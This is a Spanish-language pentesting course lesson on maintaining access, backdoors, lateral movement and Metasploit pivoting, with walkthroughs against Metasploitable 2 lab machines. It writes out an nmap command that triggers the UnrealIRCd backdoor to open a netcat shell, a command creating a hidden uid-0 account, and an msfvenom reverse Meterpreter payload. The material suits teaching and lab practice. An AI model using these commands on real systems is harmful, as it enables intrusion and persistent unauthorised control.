---
title: "Mantenimiento del Acceso Obtenido en El Sistema Objetivo"
subtitle: "Descubre t√©cnicas y herramientas efectivas para mantener el acceso persistente durante las pruebas de penetraci√≥n. Aprende sobre m√©todos como la creaci√≥n de cuentas adicionales, el uso de puertas traseras y otras estrategias para asegurar un acceso a largo plazo. Conoce las mejores pr√°cticas y herramientas utilizadas en el proceso de post-explotaci√≥n."
tags: ["pentesting", "ciberseguridad", "pruebas-penetracion"]
authors: ["blindma1den", "lorenagubaira"]

---

![Vulnerability Post Exploitation](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/post-explotacion.png?raw=true)

El mantenimiento del acceso obtenido en el sistema objetivo es una fase cr√≠tica en las pruebas de penetraci√≥n, donde el objetivo es asegurar la persistencia y continuidad del acceso. Aqu√≠ se describen algunas t√©cnicas comunes utilizadas para mantener el acceso en el sistema:

1. Creaci√≥n de Cuentas de Usuario Adicionales: Crear cuentas de usuario adicionales con privilegios elevados para asegurar el acceso incluso si las credenciales originales son revocadas.
2. Creaci√≥n de Backdoors: Instalar backdoors en el sistema para permitir el acceso posterior incluso despu√©s de que las vulnerabilidades utilizadas inicialmente hayan sido parcheadas.
3.  Programaci√≥n de Tareas y Servicios: Configurar tareas programadas o servicios que se ejecuten de forma peri√≥dica para mantener el acceso persistente.
4.  Uso de Malware Persistente: Implantar malware persistente que se inicie autom√°ticamente con el sistema operativo para mantener el control del sistema.
5. Modificaci√≥n de Configuraciones de Seguridad: Cambiar configuraciones de seguridad para permitir el acceso remoto o manipular configuraciones de firewall.
6. Uso de T√∫neles Encubiertos: Establecer t√∫neles encubiertos o canales encubiertos para eludir la detecci√≥n y mantener una comunicaci√≥n encubierta.
7. Ofuscaci√≥n de Actividades: Ofuscar las actividades realizadas para evitar la detecci√≥n, como cambiar nombres de archivos o enmascarar comandos.
8. Uso de Certificados Maliciosos: Implementar certificados maliciosos para evadir la detecci√≥n de herramientas de seguridad.
9. Uso de Canales Encubiertos en Protocolos Leg√≠timos: Utilizar canales encubiertos en protocolos leg√≠timos, como DNS o HTTP, para pasar desapercibido.
10. Monitorizaci√≥n de Cambios en el Sistema: Monitorear cambios en el sistema y ajustar las t√°cticas en respuesta a las actualizaciones de seguridad.

> üìñ En este caso en vez de dar un o unos pocos ejemplos es tema que debemos abordar con mas profundidad. Con lo cual veremos una lista de recursos para profundizar acerca de este tema y que se pueda aprender en mayor profundidad. En esta gran recopilaci√≥n de t√©cnicas de persistencia podemos verlas mapeadas con Mitre e indicando adem√°s si se necesitan permisos o no de administrador en cada una de ellas:

| T√©cnica | Mitre | Permisos de administrador |
| --- | --- | --- |
| https://pentestlab.blog/2020/01/14/persistence-winlogon-helper-dll/ | https://attack.mitre.org/techniques/T1004/ | SI |
| https://pentestlab.blog/2019/10/28/persistence-port-monitors/ | https://attack.mitre.org/techniques/T1013/ | SI |
| https://pentestlab.blog/2019/11/13/persistence-accessibility-features/ | https://attack.mitre.org/techniques/T1015/ | SI |
| https://pentestlab.blog/2019/10/08/persistence-shortcut-modification/ | https://attack.mitre.org/techniques/T1023/ | NO |
| https://pentestlab.blog/2020/01/22/persistence-modify-existing-service/ | https://attack.mitre.org/techniques/T1031/ | SI |
| https://pentestlab.blog/2020/03/04/persistence-dll-hijacking/ | https://attack.mitre.org/techniques/T1038/ | SI |
| https://pentestlab.blog/2020/01/06/persistence-change-default-file-association/ | https://attack.mitre.org/techniques/T1042/ | NO |
| https://pentestlab.blog/2019/10/07/persistence-new-service/ | https://attack.mitre.org/techniques/T1050/ | SI |
| https://pentestlab.blog/2019/11/04/persistence-scheduled-tasks/ | https://attack.mitre.org/techniques/T1053/ | NO |
| https://pentestlab.blog/2020/01/22/persistence-modify-existing-service/ | https://attack.mitre.org/techniques/T1058/ | NO |
| https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/ | https://attack.mitre.org/techniques/T1060/ | NO |
| https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/ | https://attack.mitre.org/techniques/T1084/ | SI |
| https://pentestlab.blog/2019/10/21/persistence-security-support-provider/ | https://attack.mitre.org/techniques/T1101/ | SI |
| https://pentestlab.blog/2020/01/07/persistence-appinit-dlls/ | https://attack.mitre.org/techniques/T1103/ | SI |
| https://pentestlab.blog/2020/05/20/persistence-com-hijacking/ | https://attack.mitre.org/techniques/T1122/ | NO |
| https://pentestlab.blog/2019/10/29/persistence-netsh-helper-dll/ | https://attack.mitre.org/techniques/T1128/ | SI |
| https://pentestlab.blog/2019/12/11/persistence-office-application-startup/ | https://attack.mitre.org/techniques/T1137/ | NO |
| https://pentestlab.blog/2019/12/16/persistence-application-shimming/ | https://attack.mitre.org/techniques/T1138/ | SI |
| https://pentestlab.blog/2019/10/09/persistence-screensaver/ | https://attack.mitre.org/techniques/T1180/ | NO |
| https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/ | https://attack.mitre.org/techniques/T1183/ | SI |
| https://pentestlab.blog/2019/10/30/persistence-bits-jobs/ | https://attack.mitre.org/techniques/T1197/ | NO |
| https://pentestlab.blog/2019/10/22/persistence-time-providers/ | https://attack.mitre.org/techniques/T1209/ | SI |
| https://pentestlab.blog/2019/11/05/persistence-powershell-profile/ | https://attack.mitre.org/techniques/T1504/ | NO |
| https://pentestlab.blog/2020/02/04/persistence-waitfor/ | https://pentestlab.blog/methodologies/red-teaming/persistence/ | SI |
| https://pentestlab.blog/2020/02/12/persistence-rid-hijacking/ | https://pentestlab.blog/methodologies/red-teaming/persistence/ | SI |

## Uso de backdoors y herramientas de persistencia

El uso de backdoors y herramientas de persistencia es una t√©cnica com√∫n en pruebas de penetraci√≥n, pero es esencial comprender que estas acciones deben llevarse a cabo de manera √©tica y legal, con el consentimiento expl√≠cito del propietario del sistema. Aqu√≠ se describen algunas t√©cnicas comunes relacionadas con backdoors y persistencia:

Los backdoors son mecanismos ocultos que permiten el acceso no autorizado al sistema incluso despu√©s de que se hayan corregido las vulnerabilidades iniciales. 

### T√©cnicas:

> Inyecci√≥n de C√≥digo: Insertar c√≥digo malicioso en aplicaciones o scripts existentes para crear una puerta trasera.

> Creaci√≥n de Cuentas de Usuario Adicionales: Crear cuentas de usuario adicionales con privilegios elevados para garantizar el acceso persistente.

### Herramientas de Persistencia:

Estas herramientas se utilizan para mantener el acceso continuo al sistema, automatizando la ejecuci√≥n de comandos o acciones espec√≠ficas. Ejemplos de Herramientas:

- PowerShell Empire: Permite la creaci√≥n de agentes persistentes y automatiza la ejecuci√≥n de comandos.
 
- Covenant: Similar a PowerShell Empire, proporciona una plataforma para la creaci√≥n de backdoors y la automatizaci√≥n de acciones.

### Consideraciones Importantes:

- Requisito: Obtener el consentimiento expl√≠cito del propietario del sistema antes de utilizar backdoors o herramientas de persistencia.
- Uso Responsable: Limitar el uso de backdoors y herramientas de persistencia a lo estrictamente necesario para los fines de la prueba de penetraci√≥n.
- Documentaci√≥n Detallada: Documentar meticulosamente la creaci√≥n y el uso de backdoors, as√≠ como las herramientas de persistencia empleadas.
- Seguimiento Transparente: Comunicar de manera transparente con el cliente o el propietario del sistema sobre las acciones realizadas, incluyendo la implementaci√≥n de backdoors y herramientas de persistencia.
- Eliminaci√≥n Responsable: Eliminar todas las backdoors y herramientas de persistencia al finalizar las pruebas de penetraci√≥n, asegur√°ndose de no dejar puntos de acceso no autorizados.
- Evitar Da√±o No Autorizado: Evitar causar da√±o no autorizado al sistema, los datos o la integridad del entorno durante la utilizaci√≥n de backdoors y herramientas de persistencia.
- Es crucial recordar que la implementaci√≥n de backdoors y herramientas de persistencia debe realizarse con el √∫nico prop√≥sito de mejorar la seguridad del sistema y ayudar en la mitigaci√≥n de vulnerabilidades. La conducta √©tica y la transparencia son fundamentales en todas las etapas de las pruebas de penetraci√≥n.

## Backdoors deUnrealIRCd y persistencia en Metasploitable 2

UnrealIRCd es un servidor IRC Open Source. En el mes de noviembre del a√±o 2009 el archivo de nombre ‚ÄúUnreal3.2.8.1.tar.gz‚Äù fue reemplazado por una versi√≥n conteniendo una puerta trasera (troyano). Esta puerta trasera permit√≠a a cualquier persona ejecutar diversos comandos con los privilegios del usuario ejecutando ircd. La puerta trasera era ejecutada sin importar las restricciones del usuario. Para la siguiente pr√°ctica se utilizaremos, como siempre, Metasploitable 2 y Kali Linux.

Centramos la atenci√≥n en el servicio IRC del puerto TCP 6667.

![IRC](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/irc.png?raw=true)

Utilizaremos el Script NSE de nombre ‚Äúirc-unrealircd-backdoor.nse‚Äù incluida en Nmap, el cual permite verificar si este servidor IRC contiene la puerta trasera.

```bash
nmap -n -Pn -p 6667 --script=irc-unrealircd-backdoor.nse 192.168.1.49
```

![script-irc](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/script-irc.png?raw=true)

El argumento de nombre "irc-unrealircd-backdoor.command" del script, puede ser utilizado para ejecutar comandos arbitrarios en el sistema remoto. Debido a la naturaleza de esta vulnerabilidad (El resultado nunca es devuelto) no se tiene manera de obtener la salida del comando.

```bash
nmap -n -Pn -p 6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='nc -l -p 7777 -e /bin/sh' 192.168.1.49
```

![backdoor](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/backdoor.png?raw=true)

Desde otra terminal se utiliza la herramienta netcat para establecer una conexi√≥n hacia el puerto TCP 7777.

```bash
nc -n -vv 192.168.1.49 7777
```

![nc](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nc.png?raw=true)

```bash
Uname -a
```

La conexi√≥n se ha establecido correctamente. Y ya se tiene acceso en el objetivo de evaluaci√≥n con los privilegios del usuario root. Completando el punto anterior podemos crear un user root para mantener nuestra persistencia.

```bash
useradd -o --uid 0 superroot
```

![useradd](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/useradd.png?raw=true)

### Herramientas para actividades

Para mantener el acceso, incluso despu√©s de reinicios y cierres, se necesita establecer una forma de persistencia. Estas herramientas pueden ayudar:

- **SharPyShell**: Un shell obfuscado y altamente personalizable que es √∫til para mantener la persistencia.
- **SharpStay**: Esta herramienta permite la persistencia a trav√©s de la creaci√≥n de tareas programadas.
- **SharpEventPersist**: Un script que se utiliza para la persistencia a trav√©s de la suscripci√≥n a eventos de Windows.
- **PowerShell Empire**: Permite la creaci√≥n de agentes persistentes y automatiza la ejecuci√≥n de comandos.
- **Covenant**: Similar a PowerShell Empire, proporciona una plataforma para la creaci√≥n de backdoors y la automatizaci√≥n de acciones.
- **Veil-Evasion**: es una herramienta que crea payloads ofuscados para eludir la detecci√≥n de antivirus y puede utilizarse para establecer persistencia.
- **Beacon (Cobalt Strike)**: Beacon es una herramienta integrada en Cobalt Strike que permite a los actores de amenazas mantener el acceso persistente y controlar sistemas comprometidos.
- **Meterpreter (Metasploit)**: Meterpreter, un m√≥dulo de Metasploit, proporciona funcionalidades avanzadas para el acceso y control persistente en sistemas comprometidos.

Responder es una herramienta que puede ser utilizada para realizar ataques de tipo "LLMNR/NBT-NS Spoofing" y obtener credenciales, lo que puede contribuir a la persistencia.

Recuerda que el conocimiento y uso de estas herramientas deben alinearse con pr√°cticas √©ticas y legales, y solo deben ser empleadas en entornos controlados con permisos adecuados.

## Recopilaci√≥n de informaci√≥n adicional y movimiento lateral

La recopilaci√≥n de informaci√≥n adicional y el movimiento lateral son fases fundamentales en las pruebas de penetraci√≥n, pero es esencial realizarlas de manera √©tica y legal, con el consentimiento expl√≠cito del propietario del sistema.

- Enumeraci√≥n de Red: Utilizar herramientas como Nmap o Nessus para escanear y enumerar activos en la red.
- Reconocimiento Activo: Utilizar herramientas como DNSenum para recopilar informaci√≥n sobre el dominio y sus subdominios.
- B√∫squeda de Informaci√≥n en Fuentes P√∫blicas: Investigar fuentes p√∫blicas, como redes sociales y sitios web, para recopilar informaci√≥n sobre empleados y la infraestructura.

## Movimiento Lateral

Desplazarse lateralmente a trav√©s de la red, movi√©ndose de un sistema comprometido a otro, buscando oportunidades de escalada de privilegios.

- Uso de Credenciales Robadas: Utilizar credenciales robadas para autenticarse en otros sistemas y ampliar el alcance del acceso.
- Ataques de Pas-the-Ticket (PtT) o Pas-the-Hash (PtH): Utilizar tickets de Kerberos o hashes de contrase√±as para autenticarse en otros sistemas sin conocer la contrase√±a real.
- Ataques a Protocolos d√©biles: Explotar debilidades en protocolos como SMB para movimientos laterales.

## Pivoting en Metasploit

El pivoting, el proceso de acceder a redes a las que no tenemos acceso en circunstancias normales mediante el uso de computadoras comprometidas. Como punto de partida necesitaremos tener acceso a una m√°quina comprometida en la red objetivo, dependiendo de la configuraci√≥n del equipo de la v√≠ctima, es posible que necesitemos o no tener root o privilegios de administrador.

![Pivoting](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/pivoting.es.png?raw=true)

En las primeras fases de escaneo de un pentesting debemos intentar recopilar la mayor cantidad de informaci√≥n posible sobre las redes internas disponibles en la empresa. Muchas organizaciones dividen sus departamentos en segmentos de red o redes locales virtuales (VLANs), donde se alojan determinadas m√°quinas, en muchos casos los equipos que forman parte de una red tienen configuradas varias interfaces ya sean f√≠sicas o l√≥gicas hacia estas otras redes. En este tipo de circunstancias podemos aprovecharnos de esto para pivotar entre equipos de distintas redes y poder encontrar uno o varios equipos ya sean clientes o servidores con posibles vulnerabilidades explotables.

Para poner en pr√°ctica estas t√©cnicas realizaremos un taller completo en el que mostraremos dos escenarios muy similares: lab 1 y lab 2, con el fin de que se vea el concepto de pivoting entre m√°quinas que formen parte de otras redes distintas en las que desde un principio no tendr√≠amos una visibilidad directa hacia ellas desde la m√°quina en la que realizamos la auditor√≠a del test de intrusi√≥n. El nivel de pivoting de estos escenarios ser√° simple, de un solo salto, entre una m√°quina comprometida a otra. Dependiendo la topolog√≠a de red de la organizaci√≥n se podr√≠a complicar m√°s, con m√°s saltos entre m√°quinas para ir descubriendo las posibles redes internas existentes, pero la finalidad, el concepto y las t√©cnicas de pivoting seguir√≠an siendo las mismas.

En el siguiente escenario se mostrar√° un entorno formado por tres m√°quinas:

- Kali: 10.0.0.1/24. (M√°quina A)
- Ubuntu: 10.0.0.10/24 y 11.0.0.1/24. (M√°quina B)
- Linux (Apache http): 11.0.0.10/24. (M√°quina C)

![Maquinas](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquinas.es.png?raw=true)

Desde VirtualBox la configuraci√≥n de las redes es as√≠:

Creamos una NAT desde herramientas.

![nat](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nat.png?raw=true)

Kali tiene un adaptador puente

![kali-adaptador](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-adaptador.png?raw=true)

Linux tiene una NAT

![linux-nat](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/linux-nat.png?raw=true)

Ubuntu tiene:

> Adaptador 1: Adaptador puente

> Adaptador 2: Red Nat

La m√°quina Kali con Metasploit Framework ser√° desde donde realizaremos la intrusi√≥n. Tiene dos interfaces de red, una en modo NAT (eth1 simplemente para tener salida a Internet) y eth0 con la IP asignada 10.0.0.1 que forma parte de la red 10.0.0.0/24. Esta m√°quina no tiene visibilidad directa con la segunda red 11.0.0.0/24.

![kali-metasploit](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-metasploit.png?raw=true)

La m√°quina Ubuntu tiene dos interfaces la cual tiene visibilidad con la red 10.0.0.0/24 y 11.0.0.0/24 ser√° el pivoting y la segunda m√°quina Linux con una sola interface con la ip asignada 11.0.0.10 que tendr√° visibilidad para la red 11.0.0.0.0/24, esta ser√° una posible m√°quina vulnerable ya que dispondr√° de un servicio web Apache a la que tendremos que intentar llegar desde la m√°quina Kali.

![ubuntu](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/ubuntu.png?raw=true)

## Establecer una sesi√≥n Meterpreter en la m√°quina Ubuntu (pivoting)

El funcionamiento de los tipos de pivoting dentro de las posibilidades que nos ofrece Metasploit Framework debemos partir de la obtenci√≥n de una sesi√≥n Meterpreter en uno de los equipos de la red, en este caso ser√° el Ubuntu en el cual tiene visibilidad con las dos redes dentro de este laboratorio, esta ser√° la m√°quina que nos har√° de pivoting a las redes que tenga configuradas. Para este escenario podemos generar con msfvenom un payload en el que su shellcode ser√° un meterpreter linux y ejecutarlo en la m√°quina remota para obtener dicha sesi√≥n.

```bash
msfvenom -p Linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -b '\x00\x0a\x0d' -o payload
```

- *b '\x00\x0a\x0d'*: (--bad-chars) Par√°metro en el que se le puede especificar una lista de caracteres a evitar, de modo que no provoque un posible error en el momento de ejecutar el payload. En este caso estos *[opcodes](https://en.wikipedia.org/wiki/Opcode)* ser√≠an v√°lidos.

![opcodes](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/opcodes.png?raw=true)

## Route

Una vez tenemos una sesi√≥n establecida con la m√°quina Ubuntu, iniciamos el meterpreter y una forma de comprobar las redes asociadas es listar las interfaces de red con *ipconfig* para comprobar si existe alguna direcci√≥n IP asignada que forme parte de otro segmento de red distinto. Tambi√©n podr√≠amos ejecutar una *shell* dentro de meterpreter y consultar la tabla de rutas con el comando *route print*. Como vemos se muestra la red 10.0.0.0/24 en la interface 2 y la 11.0.0.0/24 en la interface 3.

![route](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/route.png?raw=true)

***Route*** es un comando que nos permitir√° encaminar tr√°fico de red dentro de Metasploit, dici√©ndole que desde cualquier m√≥dulo todo el tr√°fico que queramos llevar hacia otra red lo haga a trav√©s del identificador de una sesi√≥n establecida que tengamos activa, por ejemplo con un Meterpreter.

Salimos de la sesi√≥n de meterpreter y la dejamos en segundo plano saliendo con el comando *background*. Fuera de meterpreter y sabiendo que la m√°quina Ubuntu tiene dos redes configuradas, hacemos uso del comando route para a√±adir la visibilidad de esta nueva red a nivel de Metasploit.

```bash
route add <network> <netmask> <session_id>

route add 11.0.0.0 255.255.255.0 1
```

Con esto le estaremos diciendo que todo el tr√°fico que se produzca dentro de Metasploit con destino a la red 11.0.0.0/24 lo enrute a trav√©s de la sesi√≥n con ID 1 donde est√° el meterpreter. Con *route print* dentro de Metasploit podemos ver las rutas asignadas y con *route -h* veremos la ayuda completa.

De esta forma, ya podremos pivotar a trav√©s de la m√°quina Ubuntu a la red 11.0.0.0/24 realizando un escaneo completo hacia esa red.

En el siguiente ejemplo y para ahorrar tiempo en esta demo delimitaremos un pool de direcciones IP de la red 11.0.0.0/24 comprobando √∫nicamente el puerto 80. Vemos que encontramos una direcci√≥n 10.0.0.10 que tiene el puerto 80 abierto.

En un descubrimiento habitual podr√≠amos usar el m√≥dulo *"auxiliary/scanner/discovery/arp_sweep"* para encontrar hosts activos en la red local a trav√©s de solicitudes arp y tambi√©n *"auxiliary/scanner/portscan/ack"* para comprobar que puertos se est√°n filtrado.

![arp_sweep](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/arp_sweep.png?raw=true)

Con lo anterior ya se demostr√≥ que podemos realizar un sondeo y tener acceso a redes pivotando a trav√©s de la m√°quina Ubuntu donde tenemos la sesi√≥n meterpreter hacia una m√°quina Linux con la ip 11.0.0.10.

Ya hemos descubierto que el puerto 80 est√° abierto por lo que es probable que se trate de un servicio web, podemos ahora comprobar la versi√≥n de ese servicio http a trav√©s del m√≥dulo "*auxiliary/scanner/http/http_version*". A partir de ah√≠ podr√≠amos buscar en Internet si existe alguna vulnerabilidad conocida y explotable para versi√≥n y continuar el test de intrusi√≥n.

![http_version](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/http_version.png?raw=true)

## Autoroute (M√≥dulo post)

Otra forma de establecer rutas es hacerlo de forma autom√°tica. Una vez que tenemos una sesi√≥n establecida podemos hacer uso del m√≥dulo "*post/multi/manage/autoroute*", establecemos el ID de sesi√≥n y lo ejecutamos.

Esto har√° un barrido en el equipo donde tenemos establecida la sesi√≥n para intentar reconocer otras redes asociadas a esa m√°quina y las agregar√° autom√°ticamente a nuestra tabla de rutas de Metasploit. Es lo mismo que lo comentado anteriormente pero de forma autom√°tica sin necesidad de consultar manualmente a trav√©s de meterpreter las tablas de rutas asociadas a la m√°quina comprometida.

![rutas asociadas](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/rutas-asociadas.png?raw=true)

## Portfwd (Port Forwarding)

**portfwd** realiza un reenv√≠o de puertos *-port forwarding-* entre m√°quinas. Podemos canalizar todo el tr√°fico que enviamos a un puerto local a la escucha de nuestra m√°quina A a un puerto e IP de una m√°quina C en la que no tenemos a priori conectividad, configurando esta IP y puerto de reenv√≠o en una m√°quina B en la que si tenemos una conectividad directa.

Una ventaja de esto es que todas las peticiones que hagamos al puerto local de la m√°quina A esta las reenviar√° a la m√°quina C pasando por la m√°quina B, si analizamos el tr√°fico desde la m√°quina C veremos que esas peticiones llegan desde la m√°quina B y no desde la m√°quina A que inicialmente origina las peticiones. Como esto en un primer momento puede resultar un poco confuso mostraremos un ejemplo.

Bas√°ndonos en el mismo escenario visito hasta ahora lab 1. Desde la m√°quina Kali (m√°quina A) nos intentamos conectar a la m√°quina Linux al puerto 22 (m√°quina C), que sabemos que est√° abierto, y vemos que no podemos conectarnos directamente ya que desde la m√°quina Kali no tenemos visibilidad hacia la red 11.0.0.0/24.

Sin embargo desde la sesi√≥n 1 donde tenemos nuestro meterpreter de la m√°quina Ubuntu (m√°quina B) esta si tiene visibilidad con la red 11.0.0.0/24 donde est√° m√°quina Linux (m√°quina C). Desde el meterpreter de la sesi√≥n 1 agregamos una nueva regla de reenv√≠o de puertos.

```bash
portfwd add -l <local_port> -p <remote_port> -r <remote_host>

portfwd add -l 9500 -p 22 -r 11.0.0.10
```

Con esto indicamos que todas las peticiones que hagamos al puerto local de la m√°quina A Kali sen reenviadas al puerto 22 de la ip 11.0.0.10 que ser√° la m√°quina C Linux. Siendo la m√°quina B Ubuntu quien haga el reenv√≠o de puertos entre la m√°quina A y C. De ah√≠ que todo el tr√°fico que llegue a la m√°quina C Linux es como si lo realizase la m√°quina B Ubuntu cuando en realidad lo env√≠a la m√°quina A Kali.

Comprobando nuevamente el intento de conexi√≥n vemos como ahora **desde Metasploit Framework como desde la propia m√°quina local Kali** podemos llegar a la m√°quina C Linux estableciendo una conexi√≥n localhost hacia le puerto local a la escucha.

Si listamos los puertos a la escucha de la m√°quina local vemos como fuera del MSF tenemos el puerto 9500 a la escucha. Esto puede ser √∫til en los casos en los que necesitemos utilizar servicios web u otras herramientas fuera de Metasploit para poder escanear, vulnerar o realizar acciones hacia una m√°quina remota en la que no tendr√≠amos un acceso directo pero si conocemos su IP y puerto y tenemos una m√°quina que usaremos de pivoting en medio de la comunicaci√≥n para realizar los reenv√≠os de puertos. Tener en cuenta que podemos agregar m√°s de una regla port forwarding.

![local Kali](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/local-kali.png?raw=true)

La forma de usar m√≥dulos dentro de Metasploit con reglas configuradas de reenv√≠o de puertos es solamente por medio de conexiones locales (ip y puerto local). En el siguiente ejemplo se muestran dos reglas port forwarding establecidas en la sesi√≥n 1 (m√°quina B Ubuntu), la segunda regla indica que las peticiones que se realicen hacia el puerto 9000 desde cualquier interface de la m√°quina Kali A se reenv√≠en a trav√©s de la sesi√≥n 2 (m√°quina B Ubuntu) hacia la IP destino 11.0.0.10 puerto 80 que ser√° la m√°quina C Linux.

***RHOST***: ser√° la direcci√≥n local de la m√°quina A Kali, ip 127.0.0.1 (y no la ip 11.0.0.10 de la m√°quina destino C Linux).

***PORTS***: ser√° el puerto local a la escucha en la m√°quina A Kali, puerto 9000 (y no el puerto 80 de la m√°quina destino C Linux).

Vemos como nos indica que el puerto 9000 de la ip 127.0.0.1 est√° Open. Esto significa que la regla de reenv√≠o funcion√≥ y que realmente esa IP/Puerto local corresponder√≠an a la IP/Puerto destino configurado en la regla del portfwd. Fuera de Metasploit podemos consultar los puertos a la escucha con netstat y comprobar que tanto el puerto 9500, visto en el ejemplo anterior, como el puerto 9000 est√°n a la escucha por un proceso ruby que ser√≠a Metasploit.

![portfwd](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/portfwd.png?raw=true)

## ¬øDiferencias entre route y portfwd en Metasploit?

### Route y Autoroute

- Es necesario tener una sesi√≥n establecida.
- Agrega direcciones de red completas indicando su notaci√≥n CIDR.
- Las tablas de rutas solo se agregan a nivel funcional de Metasploit Framework.
- Dentro de Metasploit se pueden usar todos los m√≥dulos de forma directa hacia las redes agregadas.
- Con el m√≥dulo post Autorute se pueden descubrir y agregar rutas de red de forma autom√°tica de una sesi√≥n previamente establecida.

### Portfwd

- Es necesario tener una sesi√≥n establecida.
- No pueden agregar direcciones completas de red, solo se crean reglas de port forwarding hac√≠a una IP/Puerto espec√≠fico.
- Se pueden usar otras herramientas fuera de Metasploit a nivel local de la propia m√°quina Kali IP/Puerto locales estar√°n a la escucha.
- Dentro de Metasploit se pueden usar m√≥dulos hacia la IP/Puerto de la regla creada, la IP/Puerto ser√° interpretado de forma local desde la propia m√°quina Kali.
